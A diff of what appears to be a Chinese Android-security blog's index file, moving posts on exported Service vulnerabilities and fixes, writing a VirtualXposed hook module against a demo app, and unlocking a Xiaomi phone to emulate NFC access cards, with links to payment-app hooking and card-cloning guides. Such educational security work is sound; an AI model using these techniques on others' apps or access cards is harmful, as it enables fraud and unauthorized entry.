@@ -3408,80 +3408,6 @@ public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws Fil
       </tags>
   </entry>
   <entry>
-    <title>android Service漏洞挖掘</title>
-    <url>/post/3182197634.html</url>
-    <content><![CDATA[<h2 id="Service安全场景和危害"><a href="#Service安全场景和危害" class="headerlink" title="Service安全场景和危害"></a>Service安全场景和危害</h2><pre><code>Service是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  
-
-如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  
-</code></pre><h2 id="Service漏洞分类"><a href="#Service漏洞分类" class="headerlink" title="Service漏洞分类"></a>Service漏洞分类</h2><ul>
-<li>权限提升</li>
-<li>services劫持</li>
-<li>消息伪造</li>
-<li>拒绝服务</li>
-</ul>
-<h2 id="权限提升漏洞"><a href="#权限提升漏洞" class="headerlink" title="权限提升漏洞"></a>权限提升漏洞</h2><pre><code>当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。
-</code></pre><h2 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h2><pre><code>攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  
-</code></pre><h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  
-
-如：指定升级下载的URL地址，可导致任意应用安装！  
-</code></pre><h2 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>protected void onHandleIntent(Intent intent){
-    Intent v0;
-    String v23;
-    Serializable pushMsg=intent.getSerializableExtra(&quot;PushMsg&quot;);
-    ...
-    AppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();
-
-    switch(pushMsg.type){
-        case 1:{
-            goto label_53;
-
-        }
-    }
-}
-
-label_53:
-    intent.setFlags(876609536);
-    intent.setClass(this,UpdateActivity.class);
-    intent.putExtra(&quot;updateurl&quot;,pushMsg.updateurl);
-    intent.putExtra(&quot;updateversion&quot;,pushMsg.updateversion);
-    intent.putExtra(&quot;updatecontent&quot;,pushMsg.updatecontent);
-    intent.putExtra(&quot;updateType&quot;,2);
-    this.startActivity(intent);
-    return;
-</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><pre><code>Service的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  
-</code></pre><p>修复：<br>1.改成service exported false<br>2.删除多余测试代码，验证token</p>
-<h2 id="拒绝服务：防护"><a href="#拒绝服务：防护" class="headerlink" title="拒绝服务：防护"></a>拒绝服务：防护</h2><ul>
-<li>空指针异常</li>
-<li>类型转换异常</li>
-<li>数组越界访问异常</li>
-<li>类未定义异常</li>
-<li><p>其他异常</p>
-<p>  //Serializable:<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){<br>  i.getSerializableExtra(“serializable_key”);//未做异常判断<br>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
-<p>  谨慎处理接收的intent以及其携带的信息。<br>  对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  </p>
-</li>
-</ul>
-<h2 id="Service安全防护"><a href="#Service安全防护" class="headerlink" title="Service安全防护"></a>Service安全防护</h2><ul>
-<li>私有service不定义intent-filter并且设置exported为false。</li>
-<li>公开的service设置exported为true，intent-filter可以定义或者不定义。</li>
-<li>合作service需对合作方的app签名做校验。</li>
-<li>只被应用本身使用的service应设置为私有。</li>
-<li>service接收到的数据需谨慎处理。</li>
-<li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。</li>
-<li>不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。</li>
-<li>当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。</li>
-<li>有明确的服务需调用时使用显示意图。</li>
-<li>尽量不发送敏感信息。</li>
-<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>android安全</category>
-      </categories>
-      <tags>
-        <tag>anroid安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>android Activity漏洞挖掘</title>
     <url>/post/2470166639.html</url>
     <content><![CDATA[<h2 id="越权绕过漏洞"><a href="#越权绕过漏洞" class="headerlink" title="越权绕过漏洞"></a>越权绕过漏洞</h2><p>在Android系统中，Activity默认是不导出的，如果设置了 <code>exported=&quot;true&quot;</code> 这样的关键值或者是添加了<code>&lt;intent-filter&gt;</code>这样的属性，并且没有显示的设置为<code>exported=&quot;false&quot;</code>,那么此时Activity是导出的，如果Activity被不合理的导出，那么就会有越权绕过或者是泄漏敏感信息等安全风险，比如在业务过程中会有一些敏感的界面是需要用户输入密码才能查看的，但是如果没有对调起此activity的组件进行权限验证，那么就会造成验证的越权问题，导致恶意的攻击者不需要输入密码等信息也可以打开这个界面。还有通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务影响用户体验或Activity界面被劫持产生欺诈等安全事件。  </p>
@@ -3570,6 +3496,80 @@ this.b=(RouterConfig)this.getIntent().getParcelableExtra(&quot;filed_router_conf
       </categories>
       <tags>
         <tag>android安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android Service漏洞挖掘</title>
+    <url>/post/3182197634.html</url>
+    <content><![CDATA[<h2 id="Service安全场景和危害"><a href="#Service安全场景和危害" class="headerlink" title="Service安全场景和危害"></a>Service安全场景和危害</h2><pre><code>Service是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  
+
+如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  
+</code></pre><h2 id="Service漏洞分类"><a href="#Service漏洞分类" class="headerlink" title="Service漏洞分类"></a>Service漏洞分类</h2><ul>
+<li>权限提升</li>
+<li>services劫持</li>
+<li>消息伪造</li>
+<li>拒绝服务</li>
+</ul>
+<h2 id="权限提升漏洞"><a href="#权限提升漏洞" class="headerlink" title="权限提升漏洞"></a>权限提升漏洞</h2><pre><code>当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。
+</code></pre><h2 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h2><pre><code>攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  
+</code></pre><h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  
+
+如：指定升级下载的URL地址，可导致任意应用安装！  
+</code></pre><h2 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>protected void onHandleIntent(Intent intent){
+    Intent v0;
+    String v23;
+    Serializable pushMsg=intent.getSerializableExtra(&quot;PushMsg&quot;);
+    ...
+    AppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();
+
+    switch(pushMsg.type){
+        case 1:{
+            goto label_53;
+
+        }
+    }
+}
+
+label_53:
+    intent.setFlags(876609536);
+    intent.setClass(this,UpdateActivity.class);
+    intent.putExtra(&quot;updateurl&quot;,pushMsg.updateurl);
+    intent.putExtra(&quot;updateversion&quot;,pushMsg.updateversion);
+    intent.putExtra(&quot;updatecontent&quot;,pushMsg.updatecontent);
+    intent.putExtra(&quot;updateType&quot;,2);
+    this.startActivity(intent);
+    return;
+</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><pre><code>Service的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  
+</code></pre><p>修复：<br>1.改成service exported false<br>2.删除多余测试代码，验证token</p>
+<h2 id="拒绝服务：防护"><a href="#拒绝服务：防护" class="headerlink" title="拒绝服务：防护"></a>拒绝服务：防护</h2><ul>
+<li>空指针异常</li>
+<li>类型转换异常</li>
+<li>数组越界访问异常</li>
+<li>类未定义异常</li>
+<li><p>其他异常</p>
+<p>  //Serializable:<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){<br>  i.getSerializableExtra(“serializable_key”);//未做异常判断<br>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
+<p>  谨慎处理接收的intent以及其携带的信息。<br>  对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  </p>
+</li>
+</ul>
+<h2 id="Service安全防护"><a href="#Service安全防护" class="headerlink" title="Service安全防护"></a>Service安全防护</h2><ul>
+<li>私有service不定义intent-filter并且设置exported为false。</li>
+<li>公开的service设置exported为true，intent-filter可以定义或者不定义。</li>
+<li>合作service需对合作方的app签名做校验。</li>
+<li>只被应用本身使用的service应设置为私有。</li>
+<li>service接收到的数据需谨慎处理。</li>
+<li>内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。</li>
+<li>不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。</li>
+<li>当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。</li>
+<li>有明确的服务需调用时使用显示意图。</li>
+<li>尽量不发送敏感信息。</li>
+<li>启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>android安全</category>
+      </categories>
+      <tags>
+        <tag>anroid安全</tag>
       </tags>
   </entry>
   <entry>
@@ -3750,111 +3750,6 @@ mount: Permission denied</code>这个问题就新开一个命令行窗口执行<
       </categories>
       <tags>
         <tag>biu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android VitualXposed 模块编写</title>
-    <url>/post/4010998048.html</url>
-    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
-<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
-<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
-adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
-adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
-adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
-</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
-<p>build.gradle中添加  </p>
-<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
-compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
-</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
-<pre><code>&lt;application&gt;
-    &lt;meta-data
-        android:name=&quot;xposedmodule&quot;
-        android:value=&quot;true&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposeddescription&quot;
-        android:value=&quot;this is a xposed demo&quot; /&gt;
-    &lt;meta-data
-        android:name=&quot;xposedminversion&quot;
-        android:value=&quot;30&quot; /&gt;
-&lt;/application&gt;
-</code></pre><p>3.新建个项目为被hook  </p>
-<p>MainActivity.java  </p>
-<pre><code>public class MainActivity extends AppCompatActivity {
-
-    private Button btn;
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        btn = findViewById(R.id.btn);
-        btn.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
-            }
-        });
-    }
-    public String toastMessage() {
-        return &quot;我没有被劫持&quot;;
-    }
-}
-</code></pre><p>activity_main.xml  </p>
-<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
-    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
-    android:layout_width=&quot;match_parent&quot;
-    android:layout_height=&quot;match_parent&quot;
-    tools:context=&quot;.MainActivity&quot;&gt;
-    &lt;Button
-        android:id=&quot;@+id/btn&quot;
-        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
-        app:layout_constraintTop_toTopOf=&quot;parent&quot;
-        android:layout_width=&quot;wrap_content&quot;
-        android:layout_height=&quot;wrap_content&quot;
-        android:text=&quot;btn&quot;/&gt;
-
-&lt;/android.support.constraint.ConstraintLayout&gt;
-
-</code></pre><p>打包安装到VirtualXposed  </p>
-<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
-<pre><code>public class HookToast implements IXposedHookLoadPackage {
-    @Override
-    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
-        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
-            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
-            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
-                @Override
-                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
-//                    super.beforeHookedMethod(param);
-                    XposedBridge.log(&quot;you are been hooked&quot;); 
-                }
-
-                @Override
-                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
-//                    super.afterHookedMethod(param);
-                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
-                }
-            });
-        }
-    }
-}
-</code></pre><pre><code>新建app/assets文件夹
-新建xposed_init文件
-添加
-com.demo.android_hook.HookToast //修改成你的hook类
-
-然后打包测试
-</code></pre><p>app/assets/xposed_init  </p>
-<pre><code>com.demo.android_hook.HookToast
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
-]]></content>
-      <categories>
-        <category>android逆向</category>
-      </categories>
-      <tags>
-        <tag>android逆向</tag>
-        <tag>xposed</tag>
       </tags>
   </entry>
   <entry>
@@ -4086,6 +3981,111 @@ Hello World
       <tags>
         <tag>android逆向</tag>
         <tag>smali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android VitualXposed 模块编写</title>
+    <url>/post/4010998048.html</url>
+    <content><![CDATA[<h2 id="virtual-Xposed"><a href="#virtual-Xposed" class="headerlink" title="virtual Xposed"></a>virtual Xposed</h2><p><a href="https://pan.baidu.com/s/1GHoOGm7DuBtkL9AgsaJvNA" target="_blank" rel="noopener">virtual Xposed下载链接: </a><br>提取码: kyrd    </p>
+<p><a href="https://github.com/android-hacker/VirtualXposed/wiki/Utilities-For-Xposed-Module-Developer" target="_blank" rel="noopener">virtual xposed wiki</a>  </p>
+<h2 id="vx的一些命令"><a href="#vx的一些命令" class="headerlink" title="vx的一些命令"></a>vx的一些命令</h2><pre><code>adb shell am start io.va.exposed/io.virtualapp.splash.SplashActivity 启动
+adb shell am broadcast -a io.va.exposed.CMD -e cmd reboot 重启
+adb shell am broadcast -a io.va.exposed.CMD -e cmd update -e pkg &lt;package-name&gt; 安装更新app
+adb shell am broadcast -a io.va.exposed.CMD -e cmd launch -e pkg &lt;package-name&gt; 启动内部app
+</code></pre><h2 id="编写Xposed模块"><a href="#编写Xposed模块" class="headerlink" title="编写Xposed模块"></a>编写Xposed模块</h2><p>1.xposed依赖<br><a href="https://jcenter.bintray.com/de/robv/android/xposed/api/" target="_blank" rel="noopener">xposed</a>  </p>
+<p>build.gradle中添加  </p>
+<pre><code>compileOnly &#39;de.robv.android.xposed:api:82&#39;
+compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;
+</code></pre><p>2.AndroidManifest.xml添加Xposed模块  </p>
+<pre><code>&lt;application&gt;
+    &lt;meta-data
+        android:name=&quot;xposedmodule&quot;
+        android:value=&quot;true&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposeddescription&quot;
+        android:value=&quot;this is a xposed demo&quot; /&gt;
+    &lt;meta-data
+        android:name=&quot;xposedminversion&quot;
+        android:value=&quot;30&quot; /&gt;
+&lt;/application&gt;
+</code></pre><p>3.新建个项目为被hook  </p>
+<p>MainActivity.java  </p>
+<pre><code>public class MainActivity extends AppCompatActivity {
+
+    private Button btn;
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        btn = findViewById(R.id.btn);
+        btn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                Toast.makeText(MainActivity.this, toastMessage(), Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+    public String toastMessage() {
+        return &quot;我没有被劫持&quot;;
+    }
+}
+</code></pre><p>activity_main.xml  </p>
+<pre><code>&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
+    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
+    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
+    android:layout_width=&quot;match_parent&quot;
+    android:layout_height=&quot;match_parent&quot;
+    tools:context=&quot;.MainActivity&quot;&gt;
+    &lt;Button
+        android:id=&quot;@+id/btn&quot;
+        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;
+        app:layout_constraintTop_toTopOf=&quot;parent&quot;
+        android:layout_width=&quot;wrap_content&quot;
+        android:layout_height=&quot;wrap_content&quot;
+        android:text=&quot;btn&quot;/&gt;
+
+&lt;/android.support.constraint.ConstraintLayout&gt;
+
+</code></pre><p>打包安装到VirtualXposed  </p>
+<p>4.编写hook类<br><a href="https://api.xposed.info/reference/de/robv/android/xposed/XposedHelpers.html" target="_blank" rel="noopener">XposedHelpers api</a>  </p>
+<pre><code>public class HookToast implements IXposedHookLoadPackage {
+    @Override
+    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
+        if (lpparam.packageName.equals(&quot;com.demo.myapplication&quot;)){
+            Class clazz = lpparam.classLoader.loadClass(&quot;com.demo.myapplication.MainActivity&quot;);
+            XposedHelpers.findAndHookMethod(clazz, &quot;toastMessage&quot;, new XC_MethodHook() {
+                @Override
+                protected void beforeHookedMethod(MethodHookParam param) throws Throwable { //hook之前
+//                    super.beforeHookedMethod(param);
+                    XposedBridge.log(&quot;you are been hooked&quot;); 
+                }
+
+                @Override
+                protected void afterHookedMethod(MethodHookParam param) throws Throwable { // hook之后
+//                    super.afterHookedMethod(param);
+                    param.setResult(&quot;hacked by tea&quot;); //改变返回结果 
+                }
+            });
+        }
+    }
+}
+</code></pre><pre><code>新建app/assets文件夹
+新建xposed_init文件
+添加
+com.demo.android_hook.HookToast //修改成你的hook类
+
+然后打包测试
+</code></pre><p>app/assets/xposed_init  </p>
+<pre><code>com.demo.android_hook.HookToast
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/27/01.jpg" alt="最后效果">  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
+]]></content>
+      <categories>
+        <category>android逆向</category>
+      </categories>
+      <tags>
+        <tag>android逆向</tag>
+        <tag>xposed</tag>
       </tags>
   </entry>
   <entry>
@@ -4783,49 +4783,6 @@ void loop()
       </tags>
   </entry>
   <entry>
-    <title>android nfc模拟卡</title>
-    <url>/post/2987589929.html</url>
-    <content><![CDATA[<p><a href="http://bbs.xiaomi.cn/t-30553502-1-o1" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a>  </p>
-<h2 id="手机信息"><a href="#手机信息" class="headerlink" title="手机信息"></a>手机信息</h2><pre><code>手机：小米5s
-版本：MIUI10 8.11.1 开发版
-</code></pre><h2 id="0x00-解锁-amp-amp-刷机"><a href="#0x00-解锁-amp-amp-刷机" class="headerlink" title="0x00 解锁&amp;&amp;刷机"></a>0x00 解锁&amp;&amp;刷机</h2><p><strong>解锁</strong>  </p>
-<p>首先登录小米官网获取解锁工具<br><a href="https://unlock.update.miui.com" target="_blank" rel="noopener">解锁工具下载</a><br><a href="http://www.miui.com/thread-3367802-1-1.html" target="_blank" rel="noopener">小米手机解锁 Bootloader 教程以及常见问题</a>  </p>
-<p>官网给的解决方案： </p>
-<pre><code>请按照以下流程进行操作：
-1.进入“设置 -&gt; 开发者选项 -&gt; 设备解锁状态”中绑定账号和设备；
-2.手动进入Bootloader模式（关机后，同时按住开机键和音量下键）；
-3.通过USB连接手机，点击 “解锁”按钮；
-</code></pre><p>解锁的时候要检查解锁账号，要3天验证在这个手机登录  </p>
-<p>1.小米手机设置<br>设置-小米账号-登录小米账号<br>关机<br>进入Bootloader模式(同时按住开机键和音量下键)<br>会出现一个安卓小机器人下面FASTBOOT文字<br>usb连接电脑  </p>
-<p>2.电脑端<br>打开下载的手机解锁工具<br>点击解锁<br>然后弹出确认解锁<br>等待解锁  </p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/01.png" alt=""></p>
-<pre><code>设置 -&gt; 更多设置 -&gt; 开发者选项 -&gt; 设备解锁状态 -&gt; 绑定账号和设备  
-关机 -&gt; 同时按住开机键和音量下键 -&gt; 打开下载的工具 -&gt; 手机连接 -&gt; 解锁 
-
-
-开发者选项:
-我的设备 - 全部参数 - MIUI版本 多次按 进入开发者模式  
-</code></pre><p><strong>刷机</strong>  </p>
-<p><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">通用线刷教程</a>  </p>
-<p>参考了上面的文章  </p>
-<p>步骤：<br>下载通用解锁工具<br>下载线刷包下载开发版的(开发版自带root)<br>手机关机状态下，同时按住 音量下+电源键 进入Fastboot模式将手机USB连接电脑。<br>usb连接电脑<br>解压线刷包<br>打开通用解锁工具<br>选择解压目录<br>点击加载设备<br>刷机<br>等待成功  </p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/25/02.png" alt=""></p>
-<h2 id="0x01-nfc软件"><a href="#0x01-nfc软件" class="headerlink" title="0x01 nfc软件"></a>0x01 nfc软件</h2><p>在酷安找到了一些app<br><a href="https://www.coolapk.com/search?q=nfc" target="_blank" rel="noopener">nfc list</a><br>然后测试了一下NFC卡模拟  </p>
-<p>然后给NFC卡模拟 root权限 和 nfc权限  </p>
-<p>安全中心-应用管理-权限-ROOT权限管理 给 NFC卡模拟  </p>
-<p><strong>然后测试软件</strong><br>卡读取成功了<br>然后测试门禁不好使  </p>
-<hr>
-<p>后文再续</p>
-<p><a href="http://www.miui.com/thread-5869303-1-1.html" target="_blank" rel="noopener">【教程】让你的手机模拟门禁卡 拿着手机进小区 加密也模拟</a><br><a href="http://tieba.baidu.com/p/5759500931" target="_blank" rel="noopener">成功复制加密门禁卡！！！</a><br><a href="https://club.huawei.com/thread-12231900-1-1.html" target="_blank" rel="noopener">【原创】浅谈NFC手机模拟门禁卡、饭卡（非ROOT）-精华帖</a><br><a href="https://www.coolapk.com/apk/com.yuanwofei.cardemulator" target="_blank" rel="noopener">NFC卡模拟</a><br><a href="https://www.freebuf.com/geek/80368.html" target="_blank" rel="noopener">如何利用Nexus 5伪造一张门禁卡</a><br><a href="http://www.jinciwei.cn/f268134.html" target="_blank" rel="noopener">搞定加密卡！小米门禁卡模拟那些事</a><br><a href="https://club.huawei.com/thread-14272732-1-1.html" target="_blank" rel="noopener">Root神器–超级授权SuperSU_v2.82-SR5专业破解最新版！</a><br><a href="https://club.huawei.com/forum.php?mod=viewthread&amp;tid=12832132" target="_blank" rel="noopener">【HRT_梦里无念】荣耀6X TWRP3.1 EMUI5.0专用 支持Data解密</a><br><a href="http://www.miui.com/shuaji-393.html" target="_blank" rel="noopener">小米线刷</a><br><a href="https://jingyan.baidu.com/article/a3a3f8112501e38da3eb8a65.html" target="_blank" rel="noopener">小米手机MIUI9开发版开启ROOT权限方法</a><br><a 